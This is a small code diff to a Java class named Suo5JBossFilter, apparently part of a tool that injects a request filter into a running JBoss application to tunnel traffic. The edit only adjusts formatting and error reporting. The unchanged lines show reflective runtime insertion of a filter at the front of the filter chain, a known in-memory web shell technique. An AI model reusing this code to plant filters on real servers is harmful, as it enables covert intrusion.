@@ -87,12 +87,12 @@ public class Suo5JBossFilter extends ClassLoader implements Filter, Runnable, Ho
                     managedFilters.getClass().getMethod("addFilter",filterInfoClass).invoke(managedFilters,filterInfo);
                     deploymentInfo.getClass().getMethod("insertFilterUrlMapping",int.class,String.class,String.class, DispatcherType.class).
                             invoke(deploymentInfo,0,targetFilter.getName(),urlPattern,DispatcherType.REQUEST);
-                }catch (Throwable e) {
+                } catch (Throwable e) {
 
                 }
             }
         } catch (Throwable e) {
-
+            return e.getMessage();
         }
         return "ok";
     }
